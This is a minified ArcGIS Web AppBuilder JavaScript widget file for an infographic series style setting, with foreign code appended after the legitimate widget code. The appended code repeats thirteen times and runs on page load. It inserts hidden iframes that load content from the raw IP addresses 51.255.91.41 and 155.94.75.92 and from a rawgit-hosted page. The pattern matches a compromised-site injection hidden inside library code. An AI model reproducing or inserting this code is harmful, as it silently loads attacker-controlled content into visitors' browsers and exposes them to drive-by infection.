// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/_dijits/_SeriesStyleItem.html":'\x3cdiv class\x3d"field-color"\x3e\r\n   \x3cdiv data-dojo-attach-point\x3d"textContainer" class\x3d"flex-balance-low field-name"\x3e\r\n   \t\x3cdiv data-dojo-attach-point\x3d"textDiv" class\x3d"text-over field-name-div"\x3e\x3c/div\x3e\r\n   \x3c/div\x3e\r\n   \x3cdiv data-dojo-attach-point\x3d"rightPanel" class\x3d"field-color-right flex-balance-low "\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"colorDiv" class\x3d"color"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"opacityDiv" class\x3d"opacity"\x3e\x3c/div\x3e\r\n   \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/on dojo/_base/lang dojo/_base/html dojo/text!./_SeriesStyleItem.html ./ChartColorSetting dojo/Evented dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dijit/form/HorizontalSlider dijit/form/RadioButton".split(" "),function(e,c,d,b,f,g,h,k,l,m,n){return e([k,l,m,h],{baseClass:"infographic-series-style-item",templateString:f,postCreate:function(){this.inherited(arguments);this._completionOption();this._initDom();this._initEvents();this.updateByOption(this.option)},
_completionOption:function(){this.option||(this.option={});"undefined"===typeof this.option.showText&&(this.option.showText=!0);"undefined"===typeof this.option.showOpacity&&(this.option.showOpacity=!0);"undefined"===typeof this.option.colorSingleMode&&(this.option.colorSingleMode=!0);this.option.opacity||(this.option.opacity={});"undefined"===typeof this.option.opacity.min&&(this.option.opacity.min=0);"undefined"===typeof this.option.opacity.max&&(this.option.opacity.max=10);"undefined"===typeof this.option.opacity.step&&
(this.option.opacity.step=1)},updateByOption:function(a){a&&(this.option=a,this._completionOption(),this._setOpacityDisplay(),this._setColorMode(),this._setTextDisplay(),this.option.config&&this.setConfig(this.option.config))},setColorMode:function(a){this.option.colorSingleMode=a;this._setColorMode()},setOpacityDisplay:function(a){this.option.showOpacity=a;this._setOpacityDisplay()},setTextDisplay:function(a){this.option.showText=a;this._setTextDisplay()},setConfig:function(a){if(a){var b=a.label||
"",c=a.name||"";this.textDiv.innerHTML=b;this.textDiv.title=b;this.fieldName=c;if(a=a.style)this._setColor(a.color),"undefined"!==typeof a.opacity&&this._setOpacity(a.opacity)}},getConfig:function(){var a={style:{}};a.name=this.fieldName||this.textDiv.innerHTML;if(this.option.showOpacity){var b=this._getOpacity();a.style.opacity=b}b=this._getColor();a.style.color=b;return a},_initDom:function(){this.colorPicker=new g;this.colorPicker.placeAt(this.colorDiv);this.opacitySlider=new n({name:"slider",
value:this.option.opacity.min,minimum:this.option.opacity.min,maximum:this.option.opacity.max,discreteValues:this.option.opacity.max/this.option.opacity.step,intermediateChanges:!1,showButtons:!1,style:"width: 71%;margin: auto -3px auto 5px;"});this.opacitySlider.placeAt(this.opacityDiv)},_onChange:function(){var a=this.getConfig();this.emit("change",a)},_initEvents:function(){this.own(c(this.colorPicker,"change",d.hitch(this,function(){this._onChange()})));this.own(c(this.opacitySlider,"change",
d.hitch(this,function(){this._onChange()})))},_getOpacity:function(){var a=this.opacitySlider.get("value");return(a=parseInt(a,10))?a:0},_getColor:function(){return this.colorPicker.getColors()},_setTextDisplay:function(){this.option.showText?this._showText():this._hideText()},_showText:function(){b.addClass(this.rightPanel,"flex-lr-balance");b.removeClass(this.rightPanel,"flex-fill");b.setStyle(this.textContainer,"display","")},_hideText:function(){b.removeClass(this.rightPanel,"flex-lr-balance");
b.addClass(this.rightPanel,"flex-fill");b.setStyle(this.textContainer,"display","none")},_setOpacityDisplay:function(){this.option.showOpacity?this._showOpacity():this._hideOpacity()},_setColorMode:function(){this.option.colorSingleMode?this.colorPicker.setMode(!0):this.colorPicker.setMode(!1)},_setOpacity:function(a){a=parseInt(a,10);if(!a||a<this.min)a=this.min;a>this.max&&(a=this.max);this.opacitySlider.set("value",a)},_setColor:function(a){this.colorPicker.setColorsAutomatically(a)},_showOpacity:function(){b.setStyle(this.opacityDiv,
"visibility","visible")},_hideOpacity:function(){b.setStyle(this.opacityDiv,"visibility","hidden")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});